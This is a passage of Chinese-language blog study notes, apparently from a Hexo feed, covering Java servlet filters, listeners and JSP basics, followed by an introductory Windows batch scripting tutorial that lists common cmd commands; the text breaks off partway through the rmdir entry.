      2. 代理模式                * 概念：                    1. 真实对象：被代理的对象                    2. 代理对象：                    3. 代理模式：代理对象代理真实对象，达到增强真实对象功能的目的                 * 实现方式：                     1. 静态代理：有一个类文件描述代理模式                     2. 动态代理：在内存中形成代理类                        * 实现步骤：                            1. 代理对象和真实对象实现相同的接口                            2. 代理对象 = Proxy.newProxyInstance();                            3. 使用代理对象调用方法。                            4. 增强方法                        * 增强方式：                            1. 增强参数列表                            2. 增强返回值类型                            3. 增强方法体执行逻辑    </code></pre><h4 id="案例：敏感词汇过滤"><a href="#案例：敏感词汇过滤" class="headerlink" title="案例：敏感词汇过滤"></a>案例：敏感词汇过滤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 敏感词汇过滤器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SensitiveWordsFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//1.创建代理对象，增强getParameter方法</span></span><br><span class="line"></span><br><span class="line">        ServletRequest proxy_req = (ServletRequest) Proxy.newProxyInstance(req.getClass().getClassLoader(), req.getClass().getInterfaces(), <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//增强getParameter方法</span></span><br><span class="line">                <span class="comment">//判断是否是getParameter方法</span></span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;getParameter&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">//增强返回值</span></span><br><span class="line">                    <span class="comment">//获取返回值</span></span><br><span class="line">                    String value = (String) method.invoke(req,args);</span><br><span class="line">                    <span class="keyword">if</span>(value != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span> (String str : list) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(value.contains(str))&#123;</span><br><span class="line">                                value = value.replaceAll(str,<span class="string">&quot;***&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">return</span>  value;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//判断方法名是否是 getParameterMap</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//判断方法名是否是 getParameterValue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> method.invoke(req,args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.放行</span></span><br><span class="line">        chain.doFilter(proxy_req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();<span class="comment">//敏感词汇集合</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//1.获取文件真实路径</span></span><br><span class="line">            ServletContext servletContext = config.getServletContext();</span><br><span class="line">            String realPath = servletContext.getRealPath(<span class="string">&quot;/WEB-INF/classes/敏感词汇.txt&quot;</span>);</span><br><span class="line">            <span class="comment">//2.读取文件</span></span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(realPath));</span><br><span class="line">            <span class="comment">//3.将文件的每一行数据添加到list中</span></span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(line);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">            System.out.println(list);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="案例：登录验证"><a href="#案例：登录验证" class="headerlink" title="案例：登录验证"></a>案例：登录验证</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 登录验证的过滤器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(req);</span><br><span class="line">        <span class="comment">//0.强制转换</span></span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取资源请求路径</span></span><br><span class="line">        String uri = request.getRequestURI();</span><br><span class="line">        <span class="comment">//2.判断是否包含登录相关资源路径,要注意排除掉 css/js/图片/验证码等资源</span></span><br><span class="line">        <span class="keyword">if</span>(uri.contains(<span class="string">&quot;/login.jsp&quot;</span>) || uri.contains(<span class="string">&quot;/loginServlet&quot;</span>) || uri.contains(<span class="string">&quot;/css/&quot;</span>) || uri.contains(<span class="string">&quot;/js/&quot;</span>) || uri.contains(<span class="string">&quot;/fonts/&quot;</span>) || uri.contains(<span class="string">&quot;/checkCodeServlet&quot;</span>)  )&#123;</span><br><span class="line">            <span class="comment">//包含，用户就是想登录。放行</span></span><br><span class="line">            chain.doFilter(req, resp);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//不包含，需要验证用户是否登录</span></span><br><span class="line">            <span class="comment">//3.从获取session中获取user</span></span><br><span class="line">            Object user = request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(user != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//登录了。放行</span></span><br><span class="line">                chain.doFilter(req, resp);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//没有登录。跳转登录页面</span></span><br><span class="line"></span><br><span class="line">                request.setAttribute(<span class="string">&quot;login_msg&quot;</span>,<span class="string">&quot;您尚未登录，请登录&quot;</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">&quot;/login.jsp&quot;</span>).forward(request,resp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// chain.doFilter(req, resp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Listener：监听器"><a href="#Listener：监听器" class="headerlink" title="Listener：监听器"></a>Listener：监听器</h3><pre><code>* 概念：web的三大组件之一。    * 事件监听机制        * 事件    ：一件事情        * 事件源 ：事件发生的地方        * 监听器 ：一个对象        * 注册监听：将事件、事件源、监听器绑定在一起。 当事件源上发生某个事件后，执行监听器代码* ServletContextListener:监听ServletContext对象的创建和销毁    * 方法：        * void contextDestroyed(ServletContextEvent sce) ：ServletContext对象被销毁之前会调用该方法        * void contextInitialized(ServletContextEvent sce) ：ServletContext对象创建后会调用该方法    * 步骤：        1. 定义一个类，实现ServletContextListener接口        2. 复写方法        3. 配置            1. web.xml                    &lt;listener&gt;                      &lt;listener-class&gt;cn.itcast.web.listener.ContextLoaderListener&lt;/listener-class&gt;                    &lt;/listener&gt;                    * 指定初始化参数&lt;context-param&gt;            2. 注解：                * @WebListener</code></pre><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><pre><code>1. 概念：    * Java Server Pages： java服务器端页面        * 可以理解为：一个特殊的页面，其中既可以指定定义html标签，又可以定义java代码        * 用于简化书写！！！2. 原理    * JSP本质上就是一个Servlet3. JSP的脚本：JSP定义Java代码的方式    1. &lt;%  代码 %&gt;：定义的java代码，在service方法中。service方法中可以定义什么，该脚本中就可以定义什么。    2. &lt;%! 代码 %&gt;：定义的java代码，在jsp转换后的java类的成员位置。    3. &lt;%= 代码 %&gt;：定义的java代码，会输出到页面上。输出语句中可以定义什么，该脚本中就可以定义什么。4. JSP的内置对象：    * 在jsp页面中不需要获取和创建，可以直接使用的对象    * jsp一共有9个内置对象。    * 今天学习3个：        * request        * response        * out：字符输出流对象。可以将数据输出到页面上。和response.getWriter()类似            * response.getWriter()和out.write()的区别：                * 在tomcat服务器真正给客户端做出响应之前，会先找response缓冲区数据，再找out缓冲区数据。                * response.getWriter()数据输出永远在out.write()之前            1. 指令    * 作用：用于配置JSP页面，导入资源文件    * 格式：        &lt;%@ 指令名称 属性名1=属性值1 属性名2=属性值2 ... %&gt;    * 分类：        1. page        ： 配置JSP页面的            * contentType：等同于response.setContentType()                1. 设置响应体的mime类型以及字符集                2. 设置当前jsp页面的编码（只能是高级的IDE才能生效，如果使用低级工具，则需要设置pageEncoding属性设置当前页面的字符集）            * import：导包            * errorPage：当前页面发生异常后，会自动跳转到指定的错误页面            * isErrorPage：标识当前也是是否是错误页面。                * true：是，可以使用内置对象exception                * false：否。默认值。不可以使用内置对象exception        2. include    ： 页面包含的。导入页面的资源文件            * &lt;%@include file=&quot;top.jsp&quot;%&gt;        3. taglib    ： 导入资源            * &lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;                * prefix：前缀，自定义的2. 注释:    1. html注释：        &lt;!-- --&gt;:只能注释html代码片段    2. jsp注释：推荐使用        &lt;%-- --%&gt;：可以注释所有3. 内置对象    * 在jsp页面中不需要创建，直接使用的对象    * 一共有9个：            变量名                    真实类型                        作用        * pageContext                PageContext                    当前页面共享数据，还可以获取其他八个内置对象        * request                    HttpServletRequest            一次请求访问的多个资源(转发)        * session                    HttpSession                    一次会话的多个请求间        * application                ServletContext                所有用户间共享数据        * response                    HttpServletResponse            响应对象        * page                        Object                        当前页面(Servlet)的对象  this        * out                        JspWriter                    输出对象，数据输出到页面上        * config                    ServletConfig                Servlet的配置对象        * exception                    Throwable                    异常对象</code></pre><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Web&quot;&gt;&lt;a href=&quot;#Java-Web&quot; class=&quot;headerlink&quot; title=&quot;Java Web&quot;&gt;&lt;/a&gt;Java Web&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;后期学习路径&lt;/p&gt;
&lt;p&gt;ssm框架  简化web开发的经典框架</summary>
      
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="java web" scheme="https://a2914475618.github.io/tags/java-web/"/>
    
  </entry>
  
  <entry>
    <title>windows Dos批处理脚本</title>
    <link href="https://a2914475618.github.io/2021/09/13/windows-Dos%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://a2914475618.github.io/2021/09/13/windows-Dos%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-09-13T05:34:22.000Z</published>
    <updated>2021-10-16T12:23:51.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dos批处理脚本学习"><a href="#Dos批处理脚本学习" class="headerlink" title="Dos批处理脚本学习"></a>Dos批处理脚本学习</h1><h2 id="入门概述"><a href="#入门概述" class="headerlink" title="入门概述"></a>入门概述</h2><blockquote><p>batch file 批处理文件使用cmd.exe执行</p><p>脚本以bat为后缀</p><p>使用一系列内置命令进行自动化操作</p><p>例如： 匹配规则删除文件    新建文件、日志等   甚至可以创建计算机病毒 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;默认关闭显示的盘符信息</span><br><span class="line">@echo off</span><br><span class="line">&#x2F;&#x2F;输出内容</span><br><span class="line">echo hello world</span><br><span class="line">&#x2F;&#x2F;暂停 否则看不到控制台</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">内置命令</span><br><span class="line">&#x2F;&#x2F;查看当前网络的配置信息</span><br><span class="line">ipconfig</span><br><span class="line">&#x2F;&#x2F;清屏</span><br><span class="line">cls</span><br><span class="line">&#x2F;&#x2F;查看当前目录文件</span><br><span class="line">dir</span><br><span class="line">&#x2F;&#x2F;查看文件内容</span><br><span class="line">type</span><br><span class="line">type a.txt</span><br><span class="line">&#x2F;&#x2F;常用内置工具命令</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;lpl_lpl_lpl&#x2F;article&#x2F;details&#x2F;87775506</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;klchang&#x2F;p&#x2F;4771101.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部命令</span><br><span class="line">&#x2F;&#x2F;例如python  java等相关命令  mongo</span><br></pre></td></tr></table></figure><h2 id="运算操作"><a href="#运算操作" class="headerlink" title="运算操作"></a>运算操作</h2><h3 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令模式  set &#x2F;a 1+2</span><br><span class="line">&#x2F;&#x2F;执行1+2  &#x2F;a代表算术运算</span><br><span class="line">文本模式</span><br><span class="line">@echo off</span><br><span class="line">set &#x2F;a var&#x3D;1+2</span><br><span class="line">echo %var%</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h3 id="重定向运算"><a href="#重定向运算" class="headerlink" title="重定向运算"></a>重定向运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; 代表将结果存储的位置 会覆盖内容</span><br><span class="line">&gt;&gt; 不会覆盖内容  追加</span><br><span class="line">echo &quot;hellow&quot; &gt; a.txt 会创建一个a.txt同时将内容写入</span><br><span class="line">用type 查看内容</span><br><span class="line"></span><br><span class="line">&lt;  右边内容覆盖调左边的内容</span><br><span class="line">&lt;&lt; 右边内容添加到左边的内容后</span><br></pre></td></tr></table></figure><h3 id="多命令运算"><a href="#多命令运算" class="headerlink" title="多命令运算"></a>多命令运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;具有短路  第一个命令执行错误则第二个命令也不会执行</span><br><span class="line">&amp;&amp;   eg：aaaa &amp;&amp; ipconfig</span><br><span class="line">&#x2F;&#x2F;或  第一个执行则第二个也不会执行 短路</span><br><span class="line">||</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="管道操作"><a href="#管道操作" class="headerlink" title="管道操作"></a>管道操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;  | 管道符号</span><br><span class="line">A | B  A的输出等于B的输入</span><br><span class="line">dir | find &quot;.txt&quot; </span><br><span class="line">&#x2F;&#x2F;dir的输出等于 find查找的输入</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;netstat -an  输出当前所有的网络连接</span><br></pre></td></tr></table></figure><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;主命令 子命令 参数 操作 选项</span><br><span class="line">net user test test &#x2F; add  添加用户  拒绝访问</span><br><span class="line">&#x2F;?  &#x2F;help  获取详细的帮助信息</span><br></pre></td></tr></table></figure><h3 id="批处理文件参数传递"><a href="#批处理文件参数传递" class="headerlink" title="批处理文件参数传递"></a>批处理文件参数传递</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bat文件接受参数使用%num</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">echo %admin</span><br><span class="line">echo %password</span><br><span class="line">net user %admin %password &#x2F;add</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">执行</span><br><span class="line">1.bat zhangsan 123456</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过rem 命令添加注释</span><br></pre></td></tr></table></figure><h3 id="炫酷命令提示符"><a href="#炫酷命令提示符" class="headerlink" title="炫酷命令提示符"></a>炫酷命令提示符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">color 设置默认的控制台前景和背景颜色</span><br><span class="line">color &#x2F;? 查看帮助颜色的相关内容</span><br><span class="line">只能设置单次的颜色</span><br><span class="line">&#x2F;&#x2F;设置标题</span><br><span class="line">title 设置命令提示窗口的标题</span><br></pre></td></tr></table></figure><h3 id="时间相关命令"><a href="#时间相关命令" class="headerlink" title="时间相关命令"></a>时间相关命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date &#x2F;t  显示当前时间</span><br><span class="line">time &#x2F;t   显示详细时间 包括秒</span><br></pre></td></tr></table></figure><h3 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start 启动一个窗口</span><br><span class="line">start 1.bat 启动这个批处理程序</span><br><span class="line">start &#x2F;b 不会新建一个窗口</span><br><span class="line">start &#x2F;? 查看相关的帮助信息</span><br></pre></td></tr></table></figure><h3 id="调用其他Bat文件"><a href="#调用其他Bat文件" class="headerlink" title="调用其他Bat文件"></a>调用其他Bat文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call 调用其他的批处理文件程序</span><br><span class="line">call 2.bat</span><br><span class="line">调用文件中不能进行参数的传递</span><br></pre></td></tr></table></figure><h3 id="任务列表查看命令"><a href="#任务列表查看命令" class="headerlink" title="任务列表查看命令"></a>任务列表查看命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist 查看本地或者远程上运行的进程列表</span><br><span class="line">tasklist &#x2F;fi &quot;pie eq 12352&quot;  筛选出Pid为12352的</span><br><span class="line">其他内容为 查看  tasklist &#x2F;?</span><br></pre></td></tr></table></figure><h3 id="任务关闭命令"><a href="#任务关闭命令" class="headerlink" title="任务关闭命令"></a>任务关闭命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill 使用该工具按照进程id 或映像名称终止任务</span><br><span class="line">taskkill &#x2F;? 查看帮助</span><br></pre></td></tr></table></figure><h3 id="文件夹结构查看命令"><a href="#文件夹结构查看命令" class="headerlink" title="文件夹结构查看命令"></a>文件夹结构查看命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tree  查看文件夹的结构</span><br><span class="line">tree &#x2F;a</span><br><span class="line">tree &#x2F;f 显示子文件</span><br><span class="line">tree 也可以在后面跟上path 指定目录</span><br></pre></td></tr></table></figure><h3 id="关机命令"><a href="#关机命令" class="headerlink" title="关机命令"></a>关机命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shutdown</span><br><span class="line">shutdown &#x2F;?</span><br><span class="line">shutdown &#x2F;i 打开可视化界面 执行远程主机的关机操作</span><br><span class="line">shutdown &#x2F;p 关闭本地计算机</span><br></pre></td></tr></table></figure><h3 id="计划任务命令"><a href="#计划任务命令" class="headerlink" title="计划任务命令"></a>计划任务命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at 22：00 &quot;notopad.exe&quot;</span><br><span class="line">通过at指定时间</span><br><span class="line">at 查看有哪些计划任务</span><br><span class="line">at 编号 &#x2F;delete  删除计划任务</span><br></pre></td></tr></table></figure><h3 id="批处理环境变量"><a href="#批处理环境变量" class="headerlink" title="批处理环境变量"></a>批处理环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">通过set可以获取系统中的一下环境变量</span><br><span class="line">echo %OS%</span><br></pre></td></tr></table></figure><h2 id="文件夹或文件相关命令"><a href="#文件夹或文件相关命令" class="headerlink" title="文件夹或文件相关命令"></a>文件夹或文件相关命令</h2><h3 id="目录浏览"><a href="#目录浏览" class="headerlink" title="目录浏览"></a>目录浏览</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">查看当前目录</span><br><span class="line">dir &#x2F;A 查看所有的文件 包括隐藏文件</span><br><span class="line">dir &#x2F;？查看帮助信息</span><br></pre></td></tr></table></figure><h3 id="目录新建与删除"><a href="#目录新建与删除" class="headerlink" title="目录新建与删除"></a>目录新建与删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">mkdir &#x2F;a&#x2F;b&#x2F;c创建多级目录</span><br><span class="line">简写 md</span><br><span class="line"></span><br><span class="line">rmdir删除目录</span><br><span class="line">简写rd</span><br><span class="line">rmdir  &#x2F;s 